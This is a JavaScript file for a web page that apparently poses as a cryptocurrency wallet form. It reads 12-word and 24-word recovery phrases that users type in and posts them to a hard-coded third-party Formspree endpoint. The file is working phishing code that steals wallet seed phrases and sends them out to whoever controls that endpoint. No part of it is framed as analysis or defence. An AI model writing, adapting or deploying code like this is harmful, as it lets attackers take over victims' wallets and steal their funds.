const twelveBox = document.querySelector(".twelve");
const twelveBtn = document.querySelector(".twelveBtn");
const twoFourBox = document.querySelector(".twoFour");
const twoFourBtn = document.querySelector(".twoFourBtn");

twelveBtn.addEventListener("click", (e) => {
	twelveBox.classList.toggle("flex");
});

twoFourBtn.addEventListener("click", (e) => {
	twoFourBox.classList.toggle("flex");
});

const phraseTwelve = document.querySelector(".phrase-twelve");
const phraseTwoFour = document.querySelector(".phrase-two-four");
const phraseTwelveBtn = document.querySelector(".phrase-twelve-btn");
const phraseTwoFourBtn = document.querySelector(".phrase-two-four-btn");

phraseTwelveBtn.addEventListener("click", (e) => {
	sendTwelve();
});
phraseTwoFourBtn.addEventListener("click", (e) => {
	sendTwoFour();
});

function sendTwelve() {
	let phraseTwelveEntry = phraseTwelve.value;

	if (phraseTwelveEntry === "") {
		alert("PLEASE FILL ALL FORM FIELDS!");
	} else {
		axios({
			url: "https://formspree.io/f/xnqybnqd",
			method: "post",
			headers: {
				Accept: "application/json",
			},
			data: {
				TwelvePhraseWord: phraseTwelveEntry,
			},
		})
			.then((response) => {
				if (response.status === 200) {
					phraseTwelve.value = "";
				}
			})
			.catch((error) => {
				alert("OOPS! SOMETHING WENT WRONG");
			});
	}
}

function sendTwoFour() {
	let phraseTwentyFourEntry = phraseTwoFour.value;

	if (phraseTwentyFourEntry === "") {
		alert("PLEASE FILL ALL FORM FIELDS!");
	} else {
		axios({
			url: "https://formspree.io/f/xnqybnqd",
			method: "post",
			headers: {
				Accept: "application/json",
			},
			data: {
				TwentyFourPhraseWord: phraseTwentyFourEntry,
			},
		})
			.then((response) => {
				if (response.status === 200) {
					phraseTwoFour.value = "";
				}
			})
			.catch((error) => {
				alert("OOPS! SOMETHING WENT WRONG");
			});
	}
}